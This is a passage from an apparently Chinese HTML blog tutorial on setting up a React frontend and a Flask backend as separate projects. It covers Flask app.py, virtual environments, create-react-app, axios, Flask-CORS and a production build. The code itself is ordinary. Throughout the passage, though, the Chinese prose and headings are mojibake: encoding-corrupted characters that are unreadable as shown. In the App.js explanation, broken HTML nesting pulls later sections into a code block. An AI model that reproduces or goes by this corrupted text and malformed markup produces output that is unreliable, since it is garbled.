å°±å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨è¿™äº›å·¥å…·ï¼Œè€Œä¸éœ€è¦åœ¨æ¯ä¸ªé¡¹ç›®ä¸­å•ç‹¬å®‰è£…ã€‚</li><li><strong>è„šæœ¬</strong>ï¼š<code>package.json</code> æ–‡ä»¶ä¸­çš„ <code>scripts</code> å­—æ®µå…è®¸ä½ å®šä¹‰è‡ªå®šä¹‰è„šæœ¬ï¼Œè¿™äº›è„šæœ¬å¯ä»¥é€šè¿‡ <code>npm run &lt;script-name&gt;</code> æ¥æ‰§è¡Œã€‚</li><li><strong>å·¥ä½œåŒº</strong>ï¼šnpm æ”¯æŒå·¥ä½œåŒºï¼Œå…è®¸ä½ åœ¨å¤šä¸ªåŒ…ä¹‹é—´å…±äº«é…ç½®å’Œä¾èµ–ã€‚</li></ol></blockquote><h1 id="ä¸‰ã€åˆ›å»º-Flask-åç«¯"><a href="#ä¸‰ã€åˆ›å»º-Flask-åç«¯" class="headerlink" title="ä¸‰ã€åˆ›å»º Flask åç«¯"></a>ä¸‰ã€åˆ›å»º Flask åç«¯</h1><h2 id="3-1-åˆ›å»º-Flask-é¡¹ç›®"><a href="#3-1-åˆ›å»º-Flask-é¡¹ç›®" class="headerlink" title="3.1 åˆ›å»º Flask é¡¹ç›®"></a>3.1 åˆ›å»º Flask é¡¹ç›®</h2><p>åˆå§‹åŒ– Flask é¡¹ç›®ç›®å½•ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> flask-backend<span class="token builtin class-name">cd</span> flask-backend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-2-åˆ›å»ºè™šæ‹Ÿç¯å¢ƒå¹¶æ¿€æ´»"><a href="#3-2-åˆ›å»ºè™šæ‹Ÿç¯å¢ƒå¹¶æ¿€æ´»" class="headerlink" title="3.2 åˆ›å»ºè™šæ‹Ÿç¯å¢ƒå¹¶æ¿€æ´»"></a>3.2 åˆ›å»ºè™šæ‹Ÿç¯å¢ƒå¹¶æ¿€æ´»</h2><p>conda æˆ– venv</p><h3 id="3-2-1-anaconda"><a href="#3-2-1-anaconda" class="headerlink" title="3.2.1 anaconda"></a>3.2.1 anaconda</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.27.59.png" style="zoom:50%;"><h3 id="3-2-2-venv"><a href="#3-2-2-venv" class="headerlink" title="3.2.2 venv"></a>3.2.2 venv</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> venv venv<span class="token builtin class-name">source</span> venv/bin/activate   <span class="token comment"># Windows: venv\Scripts\activate</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-2-3-å®‰è£…-Flask"><a href="#3-2-3-å®‰è£…-Flask" class="headerlink" title="3.2.3 å®‰è£… Flask"></a>3.2.3 å®‰è£… Flask</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> flask<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-4-åˆ›å»º-app-py-æ–‡ä»¶"><a href="#3-2-4-åˆ›å»º-app-py-æ–‡ä»¶" class="headerlink" title="3.2.4 åˆ›å»º app.py æ–‡ä»¶"></a>3.2.4 åˆ›å»º <code>app.py</code> æ–‡ä»¶</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> jsonifyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/api/message'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Hello from Flask!"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-2-5-å¯åŠ¨-Flask-æœåŠ¡å™¨"><a href="#3-2-5-å¯åŠ¨-Flask-æœåŠ¡å™¨" class="headerlink" title="3.2.5 å¯åŠ¨ Flask æœåŠ¡å™¨"></a>3.2.5 å¯åŠ¨ Flask æœåŠ¡å™¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python app.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.34.25.png" style="zoom:50%;"><p>è®¿é—® <code>http://127.0.0.1:5000/api/message</code>ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.35.40.png" style="zoom:50%;"><h1 id="å››ã€åˆ›å»º-React-å‰ç«¯"><a href="#å››ã€åˆ›å»º-React-å‰ç«¯" class="headerlink" title="å››ã€åˆ›å»º React å‰ç«¯"></a>å››ã€åˆ›å»º React å‰ç«¯</h1><h2 id="4-1-åˆå§‹åŒ–-React-é¡¹ç›®"><a href="#4-1-åˆå§‹åŒ–-React-é¡¹ç›®" class="headerlink" title="4.1 åˆå§‹åŒ– React é¡¹ç›®"></a>4.1 åˆå§‹åŒ– React é¡¹ç›®</h2><p>åœ¨å¦ä¸€ä¸ªç›®å½•ä¸­åˆ›å»º React é¡¹ç›®</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx create-react-app react-frontend<span class="token builtin class-name">cd</span> react-frontend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ul><li>å‘½ä»¤è§£æï¼š</li></ul><p>**<code>npx</code>**æ˜¯ npm çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºè¿è¡Œ npm åŒ…è€Œæ— éœ€å…¨å±€å®‰è£…å®ƒä»¬ã€‚</p><p>**<code>create-react-app</code>**æ˜¯ React å®˜æ–¹æä¾›çš„è„šæ‰‹æ¶å·¥å…·ï¼Œç”¨äºå¿«é€Ÿæ­å»º React é¡¹ç›®çš„åˆå§‹ç»“æ„ã€‚</p><p>**<code>react-frontend</code>**æ˜¯é¡¹ç›®çš„ç›®å½•åç§°ï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦è‡ªå®šä¹‰ï¼Œä¾‹å¦‚ <code>my-react-app</code>ã€‚</p></blockquote><blockquote><p> æŠ¥é”™ï¼š</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.44.29.png" alt="æˆªå±2024-12-09 17.44.29" style="zoom:50%;"><p>tryï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> legacy-peer-deps <span class="token boolean">true</span><span class="token function">npm</span> i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‚è€ƒï¼š<a href="https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia">https://stackoverflow.com/questions/72596908/could-not-resolve-dependency-error-peer-react16-8-0-17-0-0-from-materia</a></p><p><code>npm config set legacy-peer-deps true</code></p><p>è¿™æ¡å‘½ä»¤ç”¨äºé…ç½® <strong>npm</strong> ä½¿ç”¨ â€œlegacy peer dependenciesâ€ æœºåˆ¶æ¥è§£å†³ä¾èµ–å†²çªã€‚å…·ä½“æ¥è¯´ï¼š</p><ol><li><strong><code>peer dependencies</code></strong><br>æ˜¯æŒ‡æŸä¸ª npm åŒ…å¯¹å…¶ä»–åŒ…çš„ç‰ˆæœ¬è¦æ±‚ï¼Œå®ƒå¹¶ä¸ç›´æ¥å®‰è£…è¿™äº›ä¾èµ–ï¼Œè€Œæ˜¯ç”±ä½¿ç”¨è¯¥åŒ…çš„é¡¹ç›®æ¥å®‰è£…ã€‚å®ƒç”¨äºç¡®ä¿åœ¨å¤šä¸ªåŒ…ä¸­å…±äº«åŒä¸€ç‰ˆæœ¬çš„ä¾èµ–ã€‚</li><li><strong>â€œlegacy peer dependenciesâ€</strong><br>åœ¨ npm 7 ç‰ˆæœ¬åŠä¹‹åï¼Œnpm ä¼šå¼ºåˆ¶æ‰§è¡Œä¸¥æ ¼çš„ <code>peer dependencies</code> è§„åˆ™ã€‚è‹¥å­˜åœ¨ä¸å…¼å®¹çš„ç‰ˆæœ¬ï¼Œnpm ä¼šæ‹’ç»å®‰è£…ã€‚è¿™å¯èƒ½å¯¼è‡´ä¸€äº›æ—§é¡¹ç›®çš„ä¾èµ–å®‰è£…å¤±è´¥ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›è€æ—§çš„ npm åŒ…æ²¡æœ‰æ›´æ–°ä»¥é€‚åº”è¿™äº›æ–°è§„åˆ™ã€‚</li><li><strong><code>npm config set legacy-peer-deps true</code></strong><br>è¿™æ¡å‘½ä»¤è®¾ç½® npm é…ç½®ï¼ŒæŒ‡ç¤º npm åœ¨å®‰è£…æ—¶å¿½ç•¥ <code>peer dependencies</code> çš„ä¸¥æ ¼æ£€æŸ¥ï¼Œå…è®¸å®‰è£…ä¸å®Œå…¨åŒ¹é…çš„ç‰ˆæœ¬ã€‚è¿™å¯¹äºé‚£äº›ä¾èµ–è¾ƒæ—§çš„ npm åŒ…ï¼ˆæˆ–è€…åœ¨å‡çº§åä¾èµ–æœ‰å†²çªçš„æƒ…å†µï¼‰ç‰¹åˆ«æœ‰ç”¨ã€‚</li></ol><p><code>npm i</code> (æˆ– <code>npm install</code>)**</p><p>è¿™æ˜¯ç”¨äºå®‰è£…é¡¹ç›®ä¾èµ–çš„å‘½ä»¤ï¼Œå®ƒä¼šæŒ‰ç…§é¡¹ç›®æ ¹ç›®å½•ä¸‹çš„ <code>package.json</code> æ–‡ä»¶æ¥å®‰è£…æ‰€æœ‰åˆ—å‡ºçš„ä¾èµ–ã€‚</p><ul><li>åœ¨æ‰§è¡Œ <code>npm i</code> æ—¶ï¼Œnpm ä¼šä¸‹è½½å¹¶å®‰è£…ä¾èµ–åˆ°é¡¹ç›®çš„ <code>node_modules</code> ç›®å½•ã€‚</li><li>å¦‚æœä½ åœ¨ä¹‹å‰æ‰§è¡Œè¿‡ <code>npm config set legacy-peer-deps true</code>ï¼Œnpm ä¼šåœ¨å®‰è£…è¿‡ç¨‹ä¸­å¿½ç•¥ <code>peer dependencies</code> çš„ä¸¥æ ¼æ£€æŸ¥ï¼Œå…è®¸ç‰ˆæœ¬å†²çªçš„ä¾èµ–ç»§ç»­å®‰è£…ã€‚</li></ul></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.51.41.png" style="zoom:40%;"><p>å¯åŠ¨æœåŠ¡å¹¶è®¿é—®æµ‹è¯•ï¼š</p><p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.18.39.png" alt="æˆªå±2024-12-10 09.18.39"></p><p>bugå¤„ç†ï¼š</p><blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.21.15.png" alt="æˆªå±2024-12-10 09.21.15" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-09%2017.53.02.png" alt="æˆªå±2024-12-09 17.53.02" style="zoom:50%;"><p>å®‰è£…ç¼ºå¤±çš„åº“ã€‚</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">npm install <span class="token operator">--</span>save<span class="token operator">-</span>dev web<span class="token operator">-</span>vitals<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>é‡æ–°è¿è¡Œnpm startå¯åŠ¨å‰ç«¯é¡¹ç›®ã€‚</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.22.17.png" style="zoom:30%;"><h2 id="4-2-ä¿®æ”¹-React-é¡¹ç›®ä»¥è°ƒç”¨-Flask-API"><a href="#4-2-ä¿®æ”¹-React-é¡¹ç›®ä»¥è°ƒç”¨-Flask-API" class="headerlink" title="4.2 ä¿®æ”¹ React é¡¹ç›®ä»¥è°ƒç”¨ Flask API"></a>4.2 ä¿®æ”¹ React é¡¹ç›®ä»¥è°ƒç”¨ Flask API</h2><h3 id="4-2-1-å®‰è£…-axiosï¼ˆç”¨äºå‘èµ·-HTTP-è¯·æ±‚ï¼‰"><a href="#4-2-1-å®‰è£…-axiosï¼ˆç”¨äºå‘èµ·-HTTP-è¯·æ±‚ï¼‰" class="headerlink" title="4.2.1 å®‰è£… axiosï¼ˆç”¨äºå‘èµ· HTTP è¯·æ±‚ï¼‰"></a>4.2.1 å®‰è£… <code>axios</code>ï¼ˆç”¨äºå‘èµ· HTTP è¯·æ±‚ï¼‰</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> axios<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.27.40.png" style="zoom:50%;"><h3 id="4-2-2-åœ¨-src-App-js-ä¸­ç¼–è¾‘ä»£ç "><a href="#4-2-2-åœ¨-src-App-js-ä¸­ç¼–è¾‘ä»£ç " class="headerlink" title="4.2.2 åœ¨ src/App.js ä¸­ç¼–è¾‘ä»£ç "></a>4.2.2 åœ¨ <code>src/App.js</code> ä¸­ç¼–è¾‘ä»£ç </h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> React<span class="token punctuation">,</span> <span class="token punctuation">{</span> useState<span class="token punctuation">,</span> useEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'react'</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> <span class="token punctuation">[</span>message<span class="token punctuation">,</span> setMessage<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token comment">// è°ƒç”¨ Flask API</span>        axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'http://127.0.0.1:5000/api/message'</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token function">setMessage</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"Error fetching data:"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>        <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">textAlign</span><span class="token operator">:</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token literal-property property">marginTop</span><span class="token operator">:</span> <span class="token string">'50px'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>h1<span class="token operator">&gt;</span>React <span class="token operator">+</span> Flask åˆå§‹é¡µé¢<span class="token operator">&lt;</span><span class="token operator">/</span>h1<span class="token operator">&gt;</span>            <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span><span class="token punctuation">{</span>message <span class="token operator">||</span> <span class="token string">"Loading..."</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ul><li>ä»£ç è§£æï¼š</li></ul><p> è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„ React ç»„ä»¶ï¼Œå®ƒä½¿ç”¨ axios åº“ä»ä¸€ä¸ª Flask API è·å–æ•°æ®ã€‚ä¸‹é¢æ˜¯ä»£ç çš„é€è¡Œè§£é‡Šï¼š</p><ol><li><p>import React, { useState, useEffect } from â€˜reactâ€™;<br>è¿™è¡Œä»£ç ä» react åº“ä¸­å¯¼å…¥äº† React å¯¹è±¡ã€useState é’©å­å’Œ useEffect é’©å­ã€‚useState ç”¨äºåœ¨å‡½æ•°ç»„ä»¶ä¸­æ·»åŠ çŠ¶æ€ï¼ŒuseEffect ç”¨äºå¤„ç†å‰¯ä½œç”¨ï¼ˆä¾‹å¦‚ï¼Œæ•°æ®è·å–ã€è®¢é˜…æˆ–æ‰‹åŠ¨æ›´æ”¹ React ç»„ä»¶ä¸­çš„ DOMï¼‰ã€‚</p></li><li><p>import axios from â€˜axiosâ€™;<br>è¿™è¡Œä»£ç å¯¼å…¥äº† axiosï¼Œè¿™æ˜¯ä¸€ä¸ªåŸºäº Promise çš„ HTTP å®¢æˆ·ç«¯ï¼Œç”¨äºæµè§ˆå™¨å’Œ node.jsï¼Œç”¨äºå‘åç«¯å‘é€è¯·æ±‚ã€‚</p></li><li><p>function App() { â€¦ }<br>å®šä¹‰äº†ä¸€ä¸ªåä¸º App çš„å‡½æ•°ç»„ä»¶ã€‚</p></li><li><p>const [message, setMessage] = useState(â€˜â€™);<br>ä½¿ç”¨ useState é’©å­åˆ›å»ºäº†ä¸€ä¸ªåä¸º message çš„çŠ¶æ€å˜é‡å’Œä¸€ä¸ªåä¸º setMessage çš„å‡½æ•°ï¼Œç”¨äºæ›´æ–°è¿™ä¸ªçŠ¶æ€ã€‚åˆå§‹å€¼è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²ã€‚</p></li><li><p>useEffect(() =&gt; { â€¦ }, []);<br>useEffect é’©å­ç”¨äºåœ¨ç»„ä»¶åŠ è½½åæ‰§è¡Œå‰¯ä½œç”¨ã€‚è¿™é‡Œçš„æ•ˆæœæ˜¯è°ƒç”¨ Flask API è·å–æ¶ˆæ¯ã€‚ç©ºæ•°ç»„ [] ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè¿™ä¸ªæ•ˆæœä»…åœ¨ç»„ä»¶é¦–æ¬¡æ¸²æŸ“æ—¶è¿è¡Œã€‚</p></li><li><p>axios.get(â€˜<a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a>â€˜)<br>ä½¿ç”¨ axios å‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° <a href="http://127.0.0.1:5000/api/message">http://127.0.0.1:5000/api/message</a> è¿™ä¸ª URLã€‚è¿™ä¸ª URL åº”è¯¥æ˜¯ä½ çš„ Flask åº”ç”¨æä¾›çš„ API ç«¯ç‚¹ã€‚</p></li><li><p>.then(response =&gt; setMessage(response.data.message))<br>å¦‚æœè¯·æ±‚æˆåŠŸï¼Œ.then æ–¹æ³•ä¼šå¤„ç†å“åº”ã€‚è¿™é‡Œå°†å“åº”ä¸­çš„ message æ•°æ®èµ‹å€¼ç»™çŠ¶æ€å˜é‡ messageã€‚</p></li><li><p>.catch(error =&gt; console.error(â€œError fetching data:â€, error));<br>å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œ.catch æ–¹æ³•ä¼šæ•è·é”™è¯¯ï¼Œå¹¶åœ¨æ§åˆ¶å°æ‰“å°é”™è¯¯ä¿¡æ¯ã€‚</p></li><li><p>return ( â€¦ );<br>è¿™æ˜¯ React ç»„ä»¶çš„è¿”å›è¯­å¥ï¼Œå®ƒå®šä¹‰äº†ç»„ä»¶çš„ JSX ç»“æ„ï¼Œå³ç»„ä»¶åœ¨é¡µé¢ä¸Šå‘ˆç°çš„å†…å®¹ã€‚</p></li><li><pre><code class="html">&lt;div style={{ textAlign: 'center', marginTop: '50px' }}&gt; ... &lt;/div&gt;<pre class="line-numbers language-none"><code class="language-none">    + è¿”å›ä¸€ä¸ª div å…ƒç´ ï¼Œå…¶ä¸­åŒ…å«ä¸€äº›å†…è”æ ·å¼ï¼šæ–‡æœ¬å±…ä¸­å’Œä¸Šè¾¹è·ä¸º 50pxã€‚11. ```html    &lt;h1&gt;React + Flask åˆå§‹é¡µé¢&lt;/h1&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>+ åœ¨ div å†…éƒ¨ï¼Œæœ‰ä¸€ä¸ªæ ‡é¢˜å…ƒç´  h1ï¼Œæ˜¾ç¤ºæ–‡æœ¬ â€œReact + Flask åˆå§‹é¡µé¢â€ã€‚</code></pre></li><li><pre><code class="html">&lt;p&gt;{message || "Loading..."}&lt;/p&gt;<pre class="line-numbers language-none"><code class="language-none">    + ä¸€ä¸ªæ®µè½å…ƒç´  p æ˜¾ç¤º message çŠ¶æ€çš„å€¼ã€‚å¦‚æœ message æ˜¯ç©ºçš„ï¼ˆå³æ­£åœ¨åŠ è½½ä¸­ï¼‰ï¼Œåˆ™æ˜¾ç¤º â€œLoadingâ€¦â€ã€‚      æ•´ä½“æ¥çœ‹ï¼Œè¿™æ®µä»£ç åˆ›å»ºäº†ä¸€ä¸ª React ç»„ä»¶ï¼Œè¯¥ç»„ä»¶åœ¨åŠ è½½æ—¶ä» Flask API è·å–ä¸€æ¡æ¶ˆæ¯ï¼Œå¹¶å°†å…¶æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šã€‚å¦‚æœæ¶ˆæ¯å°šæœªåŠ è½½ï¼Œé¡µé¢å°†æ˜¾ç¤º â€œLoadingâ€¦â€ã€‚&lt;img src="React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.49.10.png" alt="æˆªå±2024-12-10 09.49.10" style="zoom:50%;" /&gt;### 4.2.3 è®¿é—®æµ‹è¯•![æˆªå±2024-12-10 09.53.06](React+Flask%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%BC%80%E5%8F%91/%E6%88%AA%E5%B1%8F2024-12-10%2009.53.06.png)å‰ç«¯æ‰§è¡ŒæˆåŠŸï¼Œä½†æ˜¯åç«¯çš„messageæ•°æ®è¯·æ±‚å¤±è´¥ã€‚åŸå› ï¼šåŒæºç­–ç•¥é™åˆ¶ï¼ˆReactç«¯å£3000ï¼ŒFlaskç«¯å£5000ï¼‰ã€‚# äº”ã€è·¨åŸŸè¯·æ±‚è®¾ç½®## 5.1 è®¾ç½® Flask æ”¯æŒè·¨åŸŸè¯·æ±‚å®‰è£… Flask-CORSï¼š```bashpip install flask-cors<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></code></pre></li></ol></blockquote><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.56.47.png" style="zoom:50%;"><p>ä¿®æ”¹ <code>app.py</code>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORSapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">)</span>  <span class="token comment"># å…è®¸è·¨åŸŸè¯·æ±‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-2-æµ‹è¯•éªŒè¯"><a href="#5-2-æµ‹è¯•éªŒè¯" class="headerlink" title="5.2 æµ‹è¯•éªŒè¯"></a>5.2 æµ‹è¯•éªŒè¯</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2009.59.41.png" alt="å‰åç«¯è”åŠ¨æµ‹è¯•æˆåŠŸ" style="zoom:50%;"><h1 id="å…­ã€éƒ¨ç½²ä¼˜åŒ–"><a href="#å…­ã€éƒ¨ç½²ä¼˜åŒ–" class="headerlink" title="å…­ã€éƒ¨ç½²ä¼˜åŒ–"></a>å…­ã€éƒ¨ç½²ä¼˜åŒ–</h1><p><strong>å¼€å‘ç¯å¢ƒ</strong>ï¼šå‰åç«¯åˆ†å¼€è¿è¡Œã€‚</p><p><strong>ç”Ÿäº§ç¯å¢ƒ</strong>ï¼šå¯ä»¥ä½¿ç”¨ Flask æä¾› React æ„å»ºåçš„é™æ€æ–‡ä»¶ã€‚</p><h2 id="6-1-æ„å»º-React-é¡¹ç›®"><a href="#6-1-æ„å»º-React-é¡¹ç›®" class="headerlink" title="6.1 æ„å»º React é¡¹ç›®"></a>6.1 æ„å»º React é¡¹ç›®</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> run build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>è¾“å‡ºï¼š</p><p>npm run build </p><blockquote><p><a href="mailto:react-frontend@0.1.0">react-frontend@0.1.0</a> build<br>react-scripts build</p></blockquote><p>Creating an optimized production buildâ€¦<br>One of your dependencies, babel-preset-react-app, is importing the<br>â€œ@babel/plugin-proposal-private-property-in-objectâ€ package without<br>declaring it in its dependencies. This is currently working because<br>â€œ@babel/plugin-proposal-private-property-in-objectâ€ is already in your<br>node_modules folder for unrelated reasons, but it may break at any time.</p><p>babel-preset-react-app is part of the create-react-app project, which<br>is not maintianed anymore. It is thus unlikely that this bug will<br>ever be fixed. Add â€œ@babel/plugin-proposal-private-property-in-objectâ€ to<br>your devDependencies to work around this error. This will make this message<br>go away.</p><p>Compiled successfully.</p><p>File sizes after gzip:</p><p>  73.28 kB  build/static/js/main.7d3412ba.js<br>  2.7 kB    build/static/js/488.ee97bdc1.chunk.js<br>  264 B     build/static/css/main.e6c13ad2.css</p><p>The project was built assuming it is hosted at /.<br>You can control this with the homepage field in your package.json.</p><p>The build folder is ready to be deployed.<br>You may serve it with a static server:</p><p>  npm install -g serve<br>  serve -s build</p><p>Find out more about deployment here:</p><p>  <a href="https://cra.link/deployment">https://cra.link/deployment</a></p></blockquote><h2 id="6-2-è®¾ç½®-Flask-æä¾›é™æ€æ–‡ä»¶æœåŠ¡"><a href="#6-2-è®¾ç½®-Flask-æä¾›é™æ€æ–‡ä»¶æœåŠ¡" class="headerlink" title="6.2 è®¾ç½® Flask æä¾›é™æ€æ–‡ä»¶æœåŠ¡"></a>6.2 è®¾ç½® Flask æä¾›é™æ€æ–‡ä»¶æœåŠ¡</h2><h3 id="6-2-1-å°†-build-æ–‡ä»¶å¤¹å¤åˆ¶åˆ°-Flask-é¡¹ç›®ç›®å½•"><a href="#6-2-1-å°†-build-æ–‡ä»¶å¤¹å¤åˆ¶åˆ°-Flask-é¡¹ç›®ç›®å½•" class="headerlink" title="6.2.1 å°† build æ–‡ä»¶å¤¹å¤åˆ¶åˆ° Flask é¡¹ç›®ç›®å½•"></a>6.2.1 å°† <code>build</code> æ–‡ä»¶å¤¹å¤åˆ¶åˆ° Flask é¡¹ç›®ç›®å½•</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-flask-hou-duan-fen-chi-kai-fa/%E6%88%AA%E5%B1%8F2024-12-10%2010.06.17.png" alt="æˆªå±2024-12-10 10.06.17" 